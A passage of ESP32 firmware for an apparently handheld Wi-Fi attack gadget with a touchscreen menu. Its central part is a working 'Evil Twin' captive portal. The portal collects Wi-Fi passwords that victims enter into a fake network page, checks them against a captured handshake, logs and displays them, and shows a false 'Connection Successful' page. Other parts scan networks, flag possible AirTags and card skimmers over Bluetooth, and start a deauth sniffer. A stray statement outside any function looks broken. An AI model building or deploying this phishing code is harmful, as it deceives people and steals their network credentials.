  for (int i = 1; i < len; i++) {
    if (password.charAt(i) != first) {
      allSame = false;
      break;
    }
  }
  if (allSame) return false;
  
  // Check for mix of character types (more likely to be real)
  bool hasUpper = false, hasLower = false, hasDigit = false, hasSpecial = false;
  for (int i = 0; i < len; i++) {
    char c = password.charAt(i);
    if (isupper(c)) hasUpper = true;
    else if (islower(c)) hasLower = true;
    else if (isdigit(c)) hasDigit = true;
    else hasSpecial = true;
  }
  
  // Strong passwords have multiple character types
  int typeCount = hasUpper + hasLower + hasDigit + hasSpecial;
  return typeCount >= 2; // At least 2 different types
}

void displayCapturedPasswords() {
  currentState = CAPTURED_PASSWORDS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("captured passwords");
  
  if (capturedCredCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 60);
    tft.println("No passwords captured yet.");
    
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 80);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.println("Start Evil Twin to capture");
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 92);
    tft.println("credentials from targets.");
  } else {
    // Status bar
    tft.setTextSize(1);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
    tft.printf("Total: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", capturedCredCount);
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(100, HEADER_HEIGHT + 5);
    tft.printf("Valid: ");
    int validCount = 0;
    for (int i = 0; i < capturedCredCount; i++) {
      if (capturedCreds[i].likelyCorrect) validCount++;
    }
    tft.setTextColor(COLOR_GREEN);
    tft.printf("%d", validCount);
    
    // Column headers
    int listY = HEADER_HEIGHT + 25;
    tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, listY);
    tft.print("NETWORK");
    tft.setCursor(200, listY);
    tft.print("STAT");
    
    tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
    listY += 15;
    
    // Display credentials (scrollable)
    int displayCount = min(capturedCredCount - credDisplayOffset, MAX_DISPLAY_CREDS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = credDisplayOffset + i;
      int y = listY + (i * 42);
      
      // Background for entry
      if (hoveredIndex == i) {
        tft.fillRect(0, y - 2, 240, 42, COLOR_HOVER_BG);
      }
      
      // Status indicator
      uint16_t statusColor = capturedCreds[idx].likelyCorrect ? COLOR_GREEN : COLOR_ORANGE;
      tft.fillCircle(SIDE_MARGIN + 2, y + 5, 3, statusColor);
      
      // SSID (truncated)
      tft.setTextSize(1);
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 10, y + 2);
      String displaySSID = capturedCreds[idx].ssid;
      if (displaySSID.length() > 22) displaySSID = displaySSID.substring(0, 21) + "~";
      tft.println(displaySSID);
      
      // BSSID
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(SIDE_MARGIN + 10, y + 12);
      tft.print(capturedCreds[idx].bssid);
      
      // Password (truncated with indicator)
      tft.setTextColor(statusColor);
      tft.setCursor(SIDE_MARGIN + 10, y + 24);
      String displayPwd = capturedCreds[idx].password;
      if (displayPwd.length() > 28) {
        displayPwd = displayPwd.substring(0, 27) + "~";
      }
      tft.print(displayPwd);
      
      // Validation status
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(200, y + 12);
      tft.print(capturedCreds[idx].likelyCorrect ? "OK" : "??");
    }
    
    // Scroll indicator
    if (capturedCredCount > MAX_DISPLAY_CREDS) {
      int scrollY = listY + (MAX_DISPLAY_CREDS * 42) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setCursor(80, scrollY);
      tft.printf("[%d-%d/%d]", 
                 credDisplayOffset + 1, 
                 credDisplayOffset + displayCount, 
                 capturedCredCount);
    }
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

String password = webServer.arg("password");

// ==================== UPDATED handlePortalPost() WITH REAL VALIDATION ====================
void handlePortalPost() {
  if (webServer.hasArg("password")) {
    String password = webServer.arg("password");
    if (password.length() > 63) {
      password = password.substring(0, 63);
    }
    password.replace("\0", "");
    
    bool basicValid = validateWiFiPassword(password);
    
    // Real validation (slow, only if handshake captured)
    bool reallyCorrect = false;
    if (capturedHandshake.captured && basicValid) {
      reallyCorrect = validatePasswordWithHandshake(password, selectedSSID);
    } else {
      reallyCorrect = basicValid;
    }
    
    // Find BSSID
    String bssidStr = "Unknown";
    for (int i = 0; i < networkCount; i++) {
      if (networks[i].ssid == selectedSSID) {
        bssidStr = "";
        for (int j = 0; j < 6; j++) {
          if (j > 0) bssidStr += ":";
          if (networks[i].bssid[j] < 16) bssidStr += "0";
          bssidStr += String(networks[i].bssid[j], HEX);
        }
        bssidStr.toUpperCase();
        break;
      }
    }
    
    // Store credential
    if (capturedCredCount < 20) {
      capturedCreds[capturedCredCount].ssid = selectedSSID;
      capturedCreds[capturedCredCount].bssid = bssidStr;
      capturedCreds[capturedCredCount].password = password;
      capturedCreds[capturedCredCount].timestamp = millis();
      capturedCreds[capturedCredCount].validated = capturedHandshake.captured;
      capturedCreds[capturedCredCount].likelyCorrect = reallyCorrect;
      capturedCredCount++;
      
      String validStr;
      if (capturedHandshake.captured) {
        validStr = reallyCorrect ? "VERIFIED CORRECT" : "VERIFIED WRONG";
      } else {
        validStr = basicValid ? "LIKELY VALID" : "WEAK/FAKE";
      }
      
      addToConsole("PWD [" + validStr + "]: " + password);
      
      Serial.printf("\n[PASSWORD CAPTURED]\n");
      Serial.printf("SSID: %s\n", selectedSSID.c_str());
      Serial.printf("BSSID: %s\n", bssidStr.c_str());
      Serial.printf("Password: %s\n", password.c_str());
      Serial.printf("Handshake: %s\n", capturedHandshake.captured ? "YES" : "NO");
      Serial.printf("Validation: %s\n", validStr.c_str());
      Serial.printf("Total captured: %d\n\n", capturedCredCount);
    }
    
    // SUCCESS RESPONSE (FIXED - No Chinese text)
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
    html += "<meta http-equiv='refresh' content='3;url=/'>";
    html += "<style>";
    html += "*{margin:0;padding:0;box-sizing:border-box;}";
    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
    html += "max-width:450px;width:100%;}";
    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
    html += ".success-icon{width:80px;height:80px;margin:0 auto 15px;background:#34C759;border-radius:50%;";
    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(52,199,89,0.3);}";
    html += ".success-icon::after{content:'✓';color:#fff;font-size:50px;font-weight:bold;}";
    html += ".content{padding:25px;text-align:center;}";
    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;line-height:1.3;}";
    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
    html += ".network-name{font-weight:600;color:#000;word-wrap:break-word;}";
    html += ".spinner{border:3px solid #e0e0e0;border-top:3px solid #007AFF;border-radius:50%;";
    html += "width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}";
    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
    html += ".redirect-text{font-size:12px;color:#86868b;margin:0;}";
    html += "@media (max-width: 400px){h2{font-size:17px;} .success-icon{width:60px;height:60px;}";
    html += ".success-icon::after{font-size:40px;}}";
    html += "</style></head>";
    html += "<body><div class='container'>";
    html += "<div class='header'>";
    html += "<div class='success-icon'></div>";
    html += "<h2>Connection Successful!</h2>";
    html += "</div>";
    html += "<div class='content'>";
    html += "<p>You are now connected to</p>";
    html += "<p class='network-name'>\"" + selectedSSID + "\"</p>";
    html += "<div class='spinner'></div>";
    html += "</div>";
    html += "<div class='footer'>";
    html += "<p class='redirect-text'>Redirecting to network settings...</p>";
    html += "</div>";
    html += "</div></body></html>";

    webServer.send(200, "text/html", html);
    
  } else {
    // ERROR RESPONSE - Missing password
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
    html += "<style>";
    html += "*{margin:0;padding:0;box-sizing:border-box;}";
    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
    html += "max-width:450px;width:100%;}";
    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
    html += ".error-icon{width:80px;height:80px;margin:0 auto 15px;background:#FF3B30;border-radius:50%;";
    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(255,59,48,0.3);}";
    html += ".error-icon::after{content:'!';color:#fff;font-size:50px;font-weight:bold;}";
    html += ".content{padding:25px;text-align:center;}";
    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;}";
    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
    html += ".btn{display:inline-block;padding:10px 24px;background:#007AFF;color:#fff;text-decoration:none;";
    html += "border-radius:6px;font-size:14px;font-weight:500;border:1px solid #007AFF;}";
    html += ".btn:active{background:#0051D5;}";
    html += "@media (max-width: 400px){h2{font-size:17px;} .error-icon{width:60px;height:60px;}";
    html += ".error-icon::after{font-size:40px;}}";
    html += "</style></head>";
    html += "<body><div class='container'>";
    html += "<div class='header'>";
    html += "<div class='error-icon'></div>";
    html += "<h2>Connection Failed</h2>";
    html += "</div>";
    html += "<div class='content'>";
    html += "<p>Password is required to connect to the network.</p>";
    html += "<p style='font-size:13px;color:#86868b;'>Please enter a valid password and try again.</p>";
    html += "</div>";
    html += "<div class='footer'>";
    html += "<a href='/' class='btn'>Go Back</a>";
    html += "</div>";
    html += "</div></body></html>";

    webServer.send(400, "text/html", html);
  }
}

// ==================== TERMINAL-STYLE MENU ITEM ====================
void drawMenuItem(const char* text, int index, int y, bool isHovered, bool isSelected) {
  int x = SIDE_MARGIN;
  int w = 240 - (2 * SIDE_MARGIN);
  int h = MENU_ITEM_HEIGHT;
  
  // Background (only show if hovered or selected)
  if (isSelected) {
    tft.fillRect(x, y, w, h, COLOR_SELECTED_BG);
  } else if (isHovered) {
    tft.fillRect(x, y, w, h, COLOR_HOVER_BG);
  }
  
  // Left bracket (terminal style)
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(x + 2, y + 7);
  tft.print("[");
  
  // Index number
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", index + 1);
  
  // Right bracket
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.print("]");
  
  // Menu text
  if (isSelected) {
    tft.setTextColor(COLOR_GREEN);  // Bright green when selected
  } else if (isHovered) {
    tft.setTextColor(COLOR_WHITE);  // White when hovered
  } else {
    tft.setTextColor(COLOR_TEXT);   // Normal grey
  }
  tft.setCursor(x + 28, y + 7);
  tft.print(text);
}

void startContinuousWiFiScan() {
  continuousWiFiScan = true;
  wifiScrollOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = WIFI_SCAN;
  addToConsole("Continuous scan started");
  
  // Start async scan
  WiFi.scanNetworks(true, false, false, 300);
  
  displayContinuousWiFiScan();
}

// ==================== DISPLAY WIFI SCAN - TERMINAL STYLE ====================
void displayWiFiScanResults() {
  currentState = WIFI_SCAN;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi scan");
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(120, listY);
  tft.print("CH");
  tft.setCursor(145, listY);
  tft.print("PWR");
  tft.setCursor(180, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display networks
  int displayCount = min(networkCount - scanDisplayOffset, MAX_DISPLAY_APS);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = scanDisplayOffset + i;
    int y = listY + (i * 22);
    
    // SSID
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 5);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(120, y + 5);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength
    int rssi = networks[idx].rssi;
    uint16_t signalColor;
    if (rssi > -50) signalColor = COLOR_GREEN;
    else if (rssi > -70) signalColor = COLOR_YELLOW;
    else signalColor = COLOR_RED;
    
    tft.setTextColor(signalColor);
    tft.setCursor(145, y + 5);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(180, y + 5);
    tft.print(networks[idx].isEncrypted ? "WPA" : "OPEN");
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

void displayContinuousWiFiScan() {
  static unsigned long lastUpdate = 0;
  
  // Only update display every 500ms to reduce flicker
  if (millis() - lastUpdate < 500) return;
  lastUpdate = millis();
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi scan");
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(120, listY);
  tft.print("CH");
  tft.setCursor(145, listY);
  tft.print("PWR");
  tft.setCursor(180, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area (stop before back button)
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25; // Safe margin
  const int ITEM_HEIGHT = 22;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  // Ensure scroll offset is valid
  if (wifiScrollOffset >= networkCount) {
    wifiScrollOffset = max(0, networkCount - MAX_ITEMS);
  }
  if (wifiScrollOffset < 0) {
    wifiScrollOffset = 0;
  }
  
  int displayCount = min(networkCount - wifiScrollOffset, MAX_ITEMS);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = wifiScrollOffset + i;
    int y = listY + (i * ITEM_HEIGHT);
    
    // Stop if too close to back button
    if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
    
    // Highlight if hovered
    if (hoveredIndex == i) {
      tft.fillRect(0, y - 2, 240, ITEM_HEIGHT, COLOR_HOVER_BG);
    }
    
    // New network indicator
    if (networks[idx].isNew && (millis() - networks[idx].lastSeen) < 3000) {
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(2, y + 5);
      tft.print("*");
    }
    
    // SSID (truncate if too long)
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
    
    tft.setTextColor(hoveredIndex == i ? COLOR_WHITE : COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 5);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(120, y + 5);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength (color coded)
    int rssi = networks[idx].rssi;
    uint16_t signalColor;
    if (rssi > -50) signalColor = COLOR_GREEN;
    else if (rssi > -70) signalColor = COLOR_YELLOW;
    else signalColor = COLOR_RED;
    
    tft.setTextColor(signalColor);
    tft.setCursor(145, y + 5);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(180, y + 5);
    tft.print(networks[idx].isEncrypted ? "WPA" : "OPEN");
  }
  
  // Scroll indicator (if needed)
  if (networkCount > MAX_ITEMS) {
  int scrollY = SAFE_BOTTOM + 2;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setTextSize(1);
  
  // Calculate text width: each char = 6px in size 1
  int currentPage = (wifiScrollOffset / MAX_ITEMS) + 1;
  int totalPages = (networkCount + MAX_ITEMS - 1) / MAX_ITEMS;
  char scrollText[30];
  sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
  int textWidth = strlen(scrollText) * 6;
  int centerX = (240 - textWidth) / 2;
  
  tft.setCursor(centerX, scrollY);
  tft.print(scrollText);
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

// ==================== PROCESS WIFI SCAN RESULTS ====================
void processWiFiScanResults() {
  int scanStatus = WiFi.scanComplete();
  
  if (scanStatus >= 0) {
    // Process each result
    for (int i = 0; i < scanStatus; i++) {
      String ssid = WiFi.SSID(i);
      uint8_t* bssid = WiFi.BSSID(i);
      
      // Check if network already exists (by BSSID)
      bool exists = false;
      int existingIndex = -1;
      
      for (int j = 0; j < networkCount; j++) {
        bool match = true;
        for (int k = 0; k < 6; k++) {
          if (networks[j].bssid[k] != bssid[k]) {
            match = false;
            break;
          }
        }
        if (match) {
          exists = true;
          existingIndex = j;
          break;
        }
      }
      
      if (exists) {
        // Update existing network
        networks[existingIndex].rssi = WiFi.RSSI(i);
        networks[existingIndex].lastSeen = millis();
        networks[existingIndex].isNew = false;
      } else if (networkCount < 50) {
        // Add new network
        networks[networkCount].ssid = ssid;
        networks[networkCount].rssi = WiFi.RSSI(i);
        networks[networkCount].channel = WiFi.channel(i);
        memcpy(networks[networkCount].bssid, bssid, 6);
        networks[networkCount].isEncrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        networks[networkCount].lastSeen = millis();
        networks[networkCount].isNew = true;  // Mark as new for highlighting
        
        // Get encryption type string
        switch (WiFi.encryptionType(i)) {
          case WIFI_AUTH_OPEN: networks[networkCount].encryption = "OPEN"; break;
          case WIFI_AUTH_WEP: networks[networkCount].encryption = "WEP"; break;
          case WIFI_AUTH_WPA_PSK: networks[networkCount].encryption = "WPA"; break;
          case WIFI_AUTH_WPA2_PSK: networks[networkCount].encryption = "WPA2"; break;
          case WIFI_AUTH_WPA_WPA2_PSK: networks[networkCount].encryption = "WPA/2"; break;
          default: networks[networkCount].encryption = "WPA2"; break;
        }
        
        networkCount++;
        
        Serial.printf("[+] New AP: %s (Ch %d, %d dBm)\n", 
                      ssid.c_str(), 
                      WiFi.channel(i), 
                      WiFi.RSSI(i));
      }
    }
    
    // Clean up and start next scan
    WiFi.scanDelete();
    if (continuousWiFiScan && currentState == WIFI_SCAN) {
      WiFi.scanNetworks(true, false, false, 300);
    }
  }
}

// ==================== SELECT TARGET - SCROLLABLE LIST ====================
void drawSelectTargetMenu() {
  if (networkCount == 0) {
    showMessage("No networks found!", COLOR_RED);
    delay(1000);
    currentState = WIFI_MENU;
    drawWiFiMenu();
    return;
  }
  
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("select target");
  
  // Status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.printf("Available: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", networkCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(110, listY);
  tft.print("CH");
  tft.setCursor(135, listY);
  tft.print("PWR");
  tft.setCursor(170, listY);
  tft.print("SEC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area (stop before back button at y=305)
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25; // 25px margin for scroll indicator
  const int ITEM_HEIGHT = 28;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT; // Calculate max items that fit
  
  // Ensure scroll offset is valid
  if (wifiScrollOffset >= networkCount) {
    wifiScrollOffset = max(0, networkCount - MAX_ITEMS);
  }
  if (wifiScrollOffset < 0) {
    wifiScrollOffset = 0;
  }
  
  int displayCount = min(networkCount - wifiScrollOffset, MAX_ITEMS);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = wifiScrollOffset + i;
    int y = listY + (i * ITEM_HEIGHT);
    
    // Stop if we're too close to back button
    if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
    
    // Hover effect
    if (hoveredIndex == i) {
      tft.fillRect(0, y - 2, 240, ITEM_HEIGHT, COLOR_HOVER_BG);
    }
    
    // SSID
    String displaySSID = networks[idx].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 12) displaySSID = displaySSID.substring(0, 11) + "~";
    
    tft.setTextColor(hoveredIndex == i ? COLOR_WHITE : COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 2);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_YELLOW);
    tft.setCursor(110, y + 2);
    tft.printf("%2d", networks[idx].channel);
    
    // Signal strength
    int rssi = networks[idx].rssi;
    tft.setTextColor(rssi > -50 ? COLOR_GREEN : rssi > -70 ? COLOR_YELLOW : COLOR_RED);
    tft.setCursor(135, y + 2);
    tft.printf("%3d", rssi);
    
    // Security
    tft.setTextColor(networks[idx].isEncrypted ? COLOR_RED : COLOR_GREEN);
    tft.setCursor(170, y + 2);
    tft.print(networks[idx].encryption);
    
    // BSSID on second line
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y + 12);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               networks[idx].bssid[0], networks[idx].bssid[1], 
               networks[idx].bssid[2], networks[idx].bssid[3], 
               networks[idx].bssid[4], networks[idx].bssid[5]);
  }
  
  // Scroll indicator (only if needed)
  if (networkCount > MAX_ITEMS) {
  int scrollY = SAFE_BOTTOM + 2;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setTextSize(1);
  
  int currentPage = (wifiScrollOffset / MAX_ITEMS) + 1;
  int totalPages = (networkCount + MAX_ITEMS - 1) / MAX_ITEMS;
  char scrollText[30];
  sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
  int textWidth = strlen(scrollText) * 6;
  int centerX = (240 - textWidth) / 2;
  
  tft.setCursor(centerX, scrollY);
  tft.print(scrollText);
  }
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

// BLE callback for AirTag and Skimmer detection
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String address = advertisedDevice.getAddress().toString().c_str();
    String name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";
    int rssi = advertisedDevice.getRSSI();
    
    // AirTag detection
    if (advertisedDevice.haveServiceUUID()) {
      if (address.startsWith("ff:ff:") || name.indexOf("AirTag") >= 0) {
        detectAirTag(address, rssi);
      }
    }
    
    // Card skimmer detection patterns
    if (name.indexOf("HC-") >= 0 || name.indexOf("BTM-") >= 0 || 
        name.indexOf("MLT-BT") >= 0 || rssi > -30) {
      detectSkimmer(name, rssi);
    }
  }
};

void animateSkull() {
  // Clear previous skull
  tft.fillRect(skullX - 12, skullY - 12, 24, 24, COLOR_BG);
  
  // Update position
  skullX += skullVelX;
  skullY += skullVelY;
  
  // Bounce off edges - PORTRAIT (240x320)
  if (skullX <= 15 || skullX >= 225) skullVelX = -skullVelX;
  if (skullY <= 45 || skullY >= 305) skullVelY = -skullVelY;
  
  // Draw new skull
  tft.setTextColor(0xFFFF);  // White
  tft.setTextSize(2);
  tft.setCursor(skullX - 10, skullY - 10);
  tft.print("X_X");
}

void detectAirTag(String address, int rssi) {
  bool found = false;
  for (int i = 0; i < airTagCount; i++) {
    if (airTags[i].address == address) {
      airTags[i].lastSeen = millis();
      airTags[i].rssi = rssi;
      airTags[i].detectionCount++;
      found = true;
      break;
    }
  }
  
  if (!found && airTagCount < 20) {
    airTags[airTagCount].address = address;
    airTags[airTagCount].rssi = rssi;
    airTags[airTagCount].lastSeen = millis();
    airTags[airTagCount].detectionCount = 1;
    airTagCount++;
  }
}

void detectSkimmer(String name, int rssi) {
  // Enhanced detection patterns for common Bluetooth skimmers
  
  bool isSuspicious = false;
  String reason = "";
  
  // Pattern 1: Very strong signal (device extremely close, like in ATM)
  if (rssi > -30) {
    isSuspicious = true;
    reason = "Extreme proximity";
  }
  
  // Pattern 2: Generic HC module names (common in DIY skimmers)
  if (name.indexOf("HC-") >= 0 || name.indexOf("BTM-") >= 0 || 
      name.indexOf("MLT-BT") >= 0 || name.indexOf("JDY-") >= 0) {
    isSuspicious = true;
    if (reason.length() > 0) reason += " + ";
    reason += "Generic BT module";
  }
  
  // Pattern 3: No name or very short name (hiding identity)
  if (name.length() == 0 || name.length() < 3) {
    if (rssi > -50) {  // Only flag if close
      isSuspicious = true;
      if (reason.length() > 0) reason += " + ";
      reason += "Hidden device";
    }
  }
  
  // Pattern 4: Names containing "SPP" (Serial Port Profile - data transfer)
  if (name.indexOf("SPP") >= 0) {
    isSuspicious = true;
    if (reason.length() > 0) reason += " + ";
    reason += "SPP detected";
  }
  
  // Pattern 5: Chinese module names often used in skimmers
  if (name.indexOf("ZS-") >= 0 || name.indexOf("XY-") >= 0 || 
      name.indexOf("DX-") >= 0) {
    isSuspicious = true;
    if (reason.length() > 0) reason += " + ";
    reason += "Known skimmer module";
  }
  
  if (isSuspicious && skimmerCount < 10) {
    // Check for duplicates
    bool duplicate = false;
    for (int i = 0; i < skimmerCount; i++) {
      if (skimmers[i].name == name) {
        duplicate = true;
        // Update RSSI if closer
        if (rssi > skimmers[i].rssi) {
          skimmers[i].rssi = rssi;
        }
        break;
      }
    }
    
    if (!duplicate) {
      skimmers[skimmerCount].name = name.length() > 0 ? name : "<hidden>";
      skimmers[skimmerCount].rssi = rssi;
      skimmers[skimmerCount].detected = millis();
      skimmerCount++;
      
      Serial.printf("\n[!] SUSPICIOUS DEVICE DETECTED!\n");
      Serial.printf("    Name: %s\n", name.length() > 0 ? name.c_str() : "<hidden>");
      Serial.printf("    RSSI: %d dBm\n", rssi);
      Serial.printf("    Reason: %s\n", reason.c_str());
      Serial.println("    WARNING: Could be a card skimmer!");
      
      addToConsole("SKIMMER: " + (name.length() > 0 ? name : "<hidden>"));
    }
  }
}

// ==================== DEAUTH SNIFFER FUNCTIONS ====================

void startDeauthSniffer() {
  deauthSnifferActive = true;
  deauthEventCount = 0;
  detectedDeauths = 0;
  deauthScrollOffset = 0;
  snifferChannel = 1;  // Start on channel 1
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  currentState = DEAUTH_SNIFFER_ACTIVE;
  addToConsole("Deauth sniffer started");
  
  Serial.println("[+] Deauth Sniffer Active - Channel Hopping Mode");
  Serial.printf("    Monitoring channels 1-13 (150ms per channel)\n");
  
  displayDeauthSnifferActive();
}

void stopDeauthSniffer() {
